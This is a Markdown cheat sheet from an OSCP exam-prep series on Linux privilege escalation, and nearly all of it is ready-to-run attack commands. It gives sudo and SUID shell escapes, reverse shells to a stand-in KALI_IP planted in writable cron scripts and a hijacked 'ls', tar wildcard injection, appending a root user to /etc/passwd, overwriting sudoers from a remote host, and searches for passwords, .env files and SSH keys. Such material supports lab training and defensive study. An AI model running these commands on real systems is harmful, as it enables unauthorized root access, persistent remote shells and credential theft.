<div align="center">

# 🐧 Linux Privilege Escalation

![Linux](https://img.shields.io/badge/OS-Linux-3fb950?style=for-the-badge&logo=linux)
![OSCP](https://img.shields.io/badge/OSCP-Must_Know-E94560?style=for-the-badge)

> **Always enumerate before you exploit. `sudo -l` first. Always.**

</div>

---

## 📋 Quick Checklist

```
[ ] sudo -l                      ← #1 priority
[ ] find / -perm -4000 2>/dev/null  ← SUID binaries
[ ] cat /etc/crontab             ← cron jobs
[ ] getcap -r / 2>/dev/null      ← capabilities
[ ] cat /etc/passwd (writable?)  ← write new root user
[ ] ps aux | grep root           ← root processes
[ ] find writable scripts in cron
[ ] check /home/*/.bash_history  ← cred hunting
[ ] run linpeas.sh               ← automated check
```

---

## 1️⃣ SUDO Abuse

> If `sudo -l` shows anything — **go to GTFOBins immediately**

```bash
sudo -l
```

### Common SUDO Exploits

| Binary | Command |
|--------|---------|
| `vim` | `sudo vim -c '!bash'` |
| `python3` | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| `find` | `sudo find / -exec /bin/bash \;` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `less` | `sudo less /etc/passwd` then `!/bin/bash` |
| `nano` | `sudo nano` → `Ctrl+R` → `Ctrl+X` → `reset; bash 1>&0 2>&0` |
| `nmap` (old) | `sudo nmap --interactive` → `!bash` |
| `bash` | `sudo bash` |
| `wget` | `sudo wget http://KALI/evil -O /etc/sudoers` |
| `cp` | `sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p` |

> **GTFOBins:** https://gtfobins.github.io/ — check EVERY binary here

---

## 2️⃣ SUID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Common SUID Exploits

<details>
<summary><b>/usr/bin/find</b></summary>

```bash
find / -exec /bin/bash -p \;
# or
/usr/bin/find . -exec /bin/bash -p \; -quit
```
</details>

<details>
<summary><b>/usr/bin/bash (SUID set)</b></summary>

```bash
bash -p
# -p preserves effective UID (root)
```
</details>

<details>
<summary><b>/bin/cp — overwrite /etc/passwd</b></summary>

```bash
# Generate password hash
openssl passwd -1 -salt hack hack123

# Create new passwd with extra root user
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$1$hack$WpXW0XzPFI1MsyBSMoNMO/:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: hack123
```
</details>

<details>
<summary><b>/usr/bin/vim</b></summary>

```bash
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
# or
/usr/bin/vim -c ':!/bin/bash'
```
</details>

---

## 3️⃣ Cron Jobs

```bash
# Check all cron locations
cat /etc/crontab
crontab -l
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /var/spool/cron/crontabs/*

# Watch for new processes (reveals hidden crons)
watch -n 1 "ps aux | grep -v grep"

# Use pspy (no root needed — monitors processes)
./pspy64
```

### Exploiting Writable Cron Script

```bash
# Found: * * * * * root /opt/backup.sh
# Check if writable:
ls -la /opt/backup.sh

# If writable — add reverse shell:
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /opt/backup.sh

# Start listener on Kali:
nc -lvnp 4444
# Wait for cron to fire (max 1 min)
```

### Wildcard Injection in Cron tar

```bash
# If cron runs: tar -czf /backup.tar.gz /var/www/*
# Create malicious files in /var/www:
echo "" > /var/www/--checkpoint=1
echo "" > "/var/www/--checkpoint-action=exec=bash shell.sh"
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' > /var/www/shell.sh
```

---

## 4️⃣ Writable /etc/passwd

```bash
# Check if writable (misconfiguration)
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt hax hax123
# Output: $1$hax$...

# Append new root user
echo 'hax:$1$hax$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax   # password: hax123
```

---

## 5️⃣ Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

| Capability | Binary | Exploit |
|-----------|--------|---------|
| `cap_setuid+ep` | python3 | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_setuid+ep` | perl | `perl -e 'use POSIX; setuid(0); exec "/bin/bash"'` |
| `cap_net_raw+ep` | ping | (sniff traffic) |
| `cap_dac_read_search` | tar | read any file |

---

## 6️⃣ PATH Hijacking

```bash
# Look for scripts run as root that call commands without full path
sudo -l
# e.g.: (root) NOPASSWD: /opt/admin_script.sh
cat /opt/admin_script.sh
# Contains: ls -la /var/www

# Create malicious 'ls' in /tmp
echo '#!/bin/bash' > /tmp/ls
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /tmp/ls
chmod +x /tmp/ls

# Hijack PATH
export PATH=/tmp:$PATH

# Trigger the script
sudo /opt/admin_script.sh
# → 'ls' runs /tmp/ls → reverse shell as root
```

---

## 7️⃣ NFS No Root Squash

```bash
# Check NFS exports on target
cat /etc/exports
# Look for: no_root_squash

# From Kali — mount the share
showmount -e TARGET_IP
sudo mount -o rw TARGET_IP:/SHARE /mnt/nfs

# As root on Kali — copy bash and SUID it
sudo cp /bin/bash /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash

# On target — run the SUID bash
/tmp/nfs/bash -p
# → root!
```

---

## 8️⃣ Credential Hunting

```bash
# Command history
cat ~/.bash_history
cat /root/.bash_history
cat /home/*/.bash_history

# Config files with passwords
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name ".env" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
ls -la /home/*/.ssh/
```

---

## 9️⃣ Kernel Exploits (Last Resort)

```bash
uname -a          # kernel version
cat /etc/os-release

# Search exploits
searchsploit linux kernel 4.4
searchsploit linux local privilege

# Common ones:
# Dirty COW     — Linux < 4.8.3   (CVE-2016-5195)
# Dirty Pipe    — Linux 5.8-5.16  (CVE-2022-0847)
# PwnKit        — pkexec           (CVE-2021-4034)
```

> ⚠️ Kernel exploits can crash the system. Use only as last resort and warn in exam notes.

---

## 🤖 Automated Tools

```bash
# LinPEAS — most comprehensive
curl http://KALI_IP/linpeas.sh | bash
# or
wget http://KALI_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh 2>&1 | tee linpeas.txt

# Linux Smart Enumeration
wget http://KALI_IP/lse.sh && chmod +x lse.sh && ./lse.sh -l1

# pspy — monitor processes without root
wget http://KALI_IP/pspy64 && chmod +x pspy64 && ./pspy64
```

---

<div align="center">
<sub>Part of <a href="https://github.com/MayanSuthar">NullyBlissful OSCP Prep Series</a> · <a href="https://medium.com/@mayan230848">Read writeups on Medium</a></sub>
</div>
